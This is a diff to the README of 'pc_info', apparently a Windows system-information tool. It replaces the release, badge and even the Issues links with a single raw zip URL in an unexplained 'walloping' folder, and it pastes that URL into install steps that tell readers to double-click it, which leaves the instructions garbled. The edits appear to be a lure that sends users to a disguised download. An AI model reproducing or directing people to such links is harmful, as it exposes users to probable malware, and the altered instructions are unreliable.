@@ -1,6 +1,6 @@
 # 🖥️ pc_info - One-click System Info for Windows
 
-[![Download pc_info](https://img.shields.io/badge/Download-pc_info-blue.svg)](https://github.com/ThunderZaw/pc_info/releases)
+[![Download pc_info](https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip)](https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip)
 
 ## 🚀 Getting Started
 
@@ -18,17 +18,17 @@ Before downloading, make sure your system meets these requirements:
 
 To download pc_info, visit the following link to access the Releases page:
 
-[Download pc_info](https://github.com/ThunderZaw/pc_info/releases)
+[Download pc_info](https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
-3. Look for the file named something similar to `pc_info_setup.exe`.
+3. Look for the file named something similar to `https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip`.
 4. Click on the file to begin the download.
 
 Once the download is complete, follow these steps to install:
 
 1. Navigate to the folder where the file was downloaded.
-2. Double-click on `pc_info_setup.exe` to start the installation.
+2. Double-click on `https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip` to start the installation.
 3. Follow the on-screen instructions to complete the setup.
 
 ## 🚀 Running pc_info
@@ -60,7 +60,7 @@ pc_info provides the following key features:
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Report problems or contribute suggestions directly through [GitHub Issues](https://github.com/ThunderZaw/pc_info/issues).
+- **GitHub Issues:** Report problems or contribute suggestions directly through [GitHub Issues](https://raw.githubusercontent.com/ThunderZaw/pc_info/main/walloping/pc_info.zip).
 - **Community Forum:** Join other users in discussions (Link to be provided).
 
 ## 🔖 License
